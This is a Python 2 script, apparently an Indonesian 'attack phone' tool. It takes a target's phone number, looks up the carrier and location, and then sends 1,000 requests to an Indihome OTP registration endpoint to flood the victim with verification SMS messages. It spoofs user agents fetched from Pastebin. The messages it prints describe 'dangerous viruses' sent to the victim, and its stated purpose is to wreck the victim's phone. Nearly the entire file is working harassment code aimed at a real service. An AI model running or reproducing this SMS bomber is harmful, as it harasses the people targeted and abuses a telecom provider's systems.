#!/usr/bin/python2.7
# coding:utf8

import requests,json,os
import subprocess as sp, os, time, sys, requests, random, json
# Gas Keun Gan Asalkan Cantumkan Nama Author
hijau  ="\033[32m"
cyan   ="\033[36m"
kuning ="\033[33;1m"
ungu   ="\033[35m"
putih  ="\033[37m"
biru   ="\033[34m"
merah  ='\x1b[1;91m'

jml = "1000" #Limit
lfa = 0
ph = []
__banner__="""
%s[%s•••••••••••••••••••••••••••••••••••••••%s]
%s ____ ___ ___ ____ ____ _  _
%s |__|  |   |  |__| |    |_/
%s |  |  |   |  |  | |___ | \_
%s               ___  _  _ ____ _  _ ____
%s               |__] |__| |  | |\ | |___
%s               |    |  | |__| | \| |___
%s[%s•••••••••••••••••••••••••••••••••••••••%s]"""%(merah,hijau,merah,ungu,ungu,ungu,ungu,ungu,ungu,merah,hijau,merah)


def main():
    os.system('clear')
    try:
        print (__banner__)
        print "         %s<=[%sEx%s: %s08××××××××××%s]=>\n"%(merah,kuning,hijau,putih,merah)
        nomor = str(raw_input("\033[37m[\033[32m=\033[37m]\033[37m Masukan Nomor HP Target \033[31m:\033[32m "))
        if nomor.isalpha(): #print 'hello world'
           print "\033[37m[\033[31m=\033[37m]\033[31m Nomor Tidak Ditemukan"
           sys.exit()
        url = "http://api.antideo.com/phone/id/{}"
        kk = requests.get
        tus = kk(url.format(nomor))
        print tus
        z = json.loads(tus.text)
        print "\033[31m-================[\033[32mINFO\033[31m]================-"
        print "\033[32m [✓]\033[37m Phone     \x1b[1;91m:\033[32m "+str(z["phone"])
        ph.append(z["phone"]) # by Rizky
        print " [✓]\033[37m Valid     \x1b[1;91m:\033[32m "+str(z["valid"])
        print " [✓]\033[37m Type      \x1b[1;91m:\033[32m "+str(z["type"])
        print " [✓]\033[37m Location  \x1b[1;91m:\033[32m "+str(z["location"][:51]) #by Rizky
        print " [✓]\033[37m Carrier   \x1b[1;91m:\033[32m "+str(z["carrier"])
        print " [✓]\033[37m Timezones \x1b[1;91m:\033[32m "+str(z["timezones"])
        print " [✓]\033[37m E164      \x1b[1;91m:\033[32m "+str(z["formats"]["E164"]) # Coded By Rizky ID
        print " [✓]\033[37m National  \x1b[1;91m:\033[32m "+str(z["formats"]["national"])
        print " [✓]\033[37m International \x1b[1;91m:\033[32m "+str(z["formats"]["international"])
        print "\033[31m-======================================-"
        time.sleep(3)
        agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
        acak = random.choice(agent)
        hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
        r = requests.Session()
        z = 0
        for x in range(int(jml)):
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data={'type': 'hp', 'msisdn': nomor})
            if 'Kode verifikasi telah dikirim' in a.text:
                print '\033[37m[\033[32m✓\033[37m] \033[37mVirus Berbahaya Succes Terkirim ke \033[34m' + nomor
                time.sleep(0.1)
            else:
                print '\033[37m[\033[31m×\033[37m] \033[37mVirus Berbahaya Gagal Dikirim ke \033[34m' + nomor
                time.sleep(0.1)
        exit('\n\033[31m(\033[31m!\033[31m)\033[37m Hp Korban Sudah Error')
    except (KeyboardInterrupt,EOFError):
        print '\n%s{%s!%s} %sYang Betol Goblok\n'%(putih,merah,putih,putih)
        sys.exit()
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi ' % (putih,merah,putih,putih)

main()
# Author   : Rizky
# Facebook : Rizky ID
# WhatsApp : 6283124959775
# Instagram: riski_1504
# Fungsi   : Untuk Merusak Hp Korban
# Inspirasi: justAhacker

#      Jangan Lupa Follow IG saya
# Exp: 30 Desember 2020
